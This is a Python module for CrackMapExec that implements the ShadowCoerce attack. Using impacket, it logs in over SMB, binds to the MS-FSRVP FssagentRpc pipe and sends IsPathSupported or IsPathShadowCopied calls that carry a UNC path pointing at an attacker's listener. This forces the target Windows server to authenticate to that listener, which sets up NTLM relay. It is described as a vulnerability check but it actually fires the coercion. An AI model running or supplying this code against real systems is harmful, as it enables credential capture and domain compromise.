#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import time
import logging 
from impacket import system_errors
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.ndr import NDRCALL
from impacket.dcerpc.v5.dtypes import BOOL, LONG, WSTR, LPWSTR
from impacket.uuid import uuidtup_to_bin
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_WINNT, RPC_C_AUTHN_LEVEL_PKT_PRIVACY

class CMEModule:
    
    name = 'shadowcoerce'
    description = "Module to check if the target is vulnerable to ShadowCoerce, credit to @Shutdown and @topotam"
    supported_protocols = ['smb']
    opsec_safe = True 
    multiple_hosts = True 

    def options(self, context, module_options):
        '''
            IPSC             Use IsPathShadowCopied (default: False). ex. IPSC=true
            LISTENER         Listener IP address (default: 127.0.0.1)
        '''
        self.ipsc = False 
        self.listener = "127.0.0.1"
        if 'LISTENER' in module_options:
            self.listener = module_options['LISTENER']
        if 'IPSC' in module_options:
            # Any string that's not empty can be casted to bool True
            self.ipsc = bool(module_options['IPSC']) 

    def on_login(self, context, connection):
        c = CoerceAuth()
        dce = c.connect(username=connection.username, password=connection.password, domain=connection.domain, lmhash=connection.lmhash, nthash=connection.nthash, target=connection.host, pipe="FssagentRpc")

        # If pipe not available, try again. "TL;DR: run the command twice if it doesn't work." - @Shutdown
        if dce == 1:
            logging.debug("First try failed. Creating another dce connection...")
            # Sleeping mandatory for second try
            time.sleep(2)
            dce = c.connect(username=connection.username, password=connection.password, domain=connection.domain, lmhash=connection.lmhash, nthash=connection.nthash, target=connection.host, pipe="FssagentRpc")
        
        if self.ipsc: 
            logging.debug("ipsc = %s", self.ipsc)
            logging.debug("Using IsPathShadowCopied!")
            result = c.IsPathShadowCopied(dce, self.listener)
        else:
            logging.debug("ipsc = %s", self.ipsc)
            logging.debug("Using the default IsPathSupported")
            result = c.IsPathSupported(dce, self.listener)

        dce.disconnect()

        if result: 
            context.log.highlight("VULNERABLE")
            context.log.highlight("Next step: https://github.com/ShutdownRepo/ShadowCoerce")
        
        else:
            logging.debug("Target not vulnerable to ShadowCoerce")

class DCERPCSessionError(DCERPCException):
    def __init__(self, error_string=None, error_code=None, packet=None):
        DCERPCException.__init__(self, error_string, error_code, packet)

    def __str__( self ):
        key = self.error_code
        error_messages = system_errors.ERROR_MESSAGES
        error_messages.update(MSFSRVP_ERROR_CODES)
        if key in error_messages:
            error_msg_short = error_messages[key][0]
            error_msg_verbose = error_messages[key][1]
            return 'SessionError: code: 0x%x - %s - %s' % (self.error_code, error_msg_short, error_msg_verbose)
        else:
            return 'SessionError: unknown error code: 0x%x' % self.error_code

################################################################################
# Error Codes
################################################################################
MSFSRVP_ERROR_CODES = {
    0x80070005: ("E_ACCESSDENIED", "The caller does not have the permissions to perform the operation"),
    0x80070057: ("E_INVALIDARG", "One or more arguments are invalid."),
    0x80042301: ("FSRVP_E_BAD_STATE", "A method call was invalid because of the state of the server."),
    0x80042316: ("FSRVP_E_SHADOW_COPY_SET_IN_PROGRESS", "A call was made to either SetContext (Opnum 1) or StartShadowCopySet (Opnum 2) while the creation of another shadow copy set is in progress."),
    0x8004230C: ("FSRVP_E_NOT_SUPPORTED", "The file store that contains the share to be shadow copied is not supported by the server."),
    0x00000102: ("FSRVP_E_WAIT_TIMEOUT", "The wait for a shadow copy commit or expose operation has timed out."),
    0xFFFFFFFF: ("FSRVP_E_WAIT_FAILED", "The wait for a shadow copy commit expose operation has failed."),
    0x8004230D: ("FSRVP_E_OBJECT_ALREADY_EXISTS", "The specified object already exists."),
    0x80042308: ("FSRVP_E_OBJECT_NOT_FOUND", "The specified object does not exist."),
    0x8004231B: ("FSRVP_E_UNSUPPORTED_CONTEXT", "The specified context value is invalid."),
    0x80042501: ("FSRVP_E_SHADOWCOPYSET_ID_MISMATCH", "The provided ShadowCopySetId does not exist."),
}


################################################################################
# RPC CALLS
################################################################################
class IsPathSupported(NDRCALL):
    opnum = 8
    structure = (
        ('ShareName', WSTR),
    )

class IsPathSupportedResponse(NDRCALL):
    structure = (
        ('SupportedByThisProvider', BOOL),
        ('OwnerMachineName', LPWSTR),
    )

class IsPathShadowCopied(NDRCALL):
    opnum = 9
    structure = (
        ('ShareName', WSTR),
    )

class IsPathShadowCopiedResponse(NDRCALL):
    structure = (
        ('ShadowCopyPresent', BOOL),
        ('ShadowCopyCompatibility', LONG),
    )

OPNUMS = {
    8 : (IsPathSupported, IsPathSupportedResponse),
    9 : (IsPathShadowCopied, IsPathShadowCopiedResponse),
}

class CoerceAuth():
    def connect(self, username, password, domain, lmhash, nthash, target, pipe):
        binding_params = {
            'FssagentRpc': {
                'stringBinding': r'ncacn_np:%s[\PIPE\FssagentRpc]' % target,
                'UUID': ('a8e0653c-2744-4389-a61d-7373df8b2292', '1.0')
            },
        }
        rpctransport = transport.DCERPCTransportFactory(binding_params[pipe]['stringBinding'])
        dce = rpctransport.get_dce_rpc()

        if hasattr(rpctransport, 'set_credentials'):
            rpctransport.set_credentials(username=username, password=password, domain=domain, lmhash=lmhash, nthash=nthash)

        dce.set_credentials(*rpctransport.get_credentials())
        dce.set_auth_type(RPC_C_AUTHN_WINNT)
        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        logging.debug("Connecting to %s" % binding_params[pipe]['stringBinding'])
        
        try:
            dce.connect()
        except Exception as e:
            # If pipe not available, try again. "TL;DR: run the command twice if it doesn't work." - @ShutdownRepo
            if str(e).find('STATUS_PIPE_NOT_AVAILABLE') >= 0:
                dce.disconnect()
                return 1

            logging.debug("Something went wrong, check error status => %s" % str(e))            

        logging.debug("Connected!")
        logging.debug("Binding to %s" % binding_params[pipe]['UUID'][0])
        try:
            dce.bind(uuidtup_to_bin(binding_params[pipe]['UUID']))
        except Exception as e:
            logging.debug("Something went wrong, check error status => %s" % str(e))

        logging.debug("Successfully bound!")
        return dce


    def IsPathShadowCopied(self, dce, listener):
        logging.debug("Sending IsPathShadowCopied!")
        try:
            request = IsPathShadowCopied()
            # only NETLOGON and SYSVOL were detected working here
            # setting the share to something else raises a 0x80042308 (FSRVP_E_OBJECT_NOT_FOUND) or 0x8004230c (FSRVP_E_NOT_SUPPORTED)
            request['ShareName'] = '\\\\%s\\NETLOGON\x00' % listener
            # request.dump()
            dce.request(request)
        except Exception as e:
            logging.debug("Something went wrong, check error status => %s", str(e))
            logging.debug("Attack may of may not have worked, check your listener...")
            return False 

        return True 

    def IsPathSupported(self, dce, listener):
        logging.debug("Sending IsPathSupported!")
        try:
            request = IsPathSupported()
            # only NETLOGON and SYSVOL were detected working here
            # setting the share to something else raises a 0x80042308 (FSRVP_E_OBJECT_NOT_FOUND) or 0x8004230c (FSRVP_E_NOT_SUPPORTED)
            request['ShareName'] = '\\\\%s\\NETLOGON\x00' % listener
            dce.request(request)
        except Exception as e:
            logging.debug("Something went wrong, check error status => %s", str(e))
            logging.debug("Attack may of may not have worked, check your listener...")
            return False 

        return True 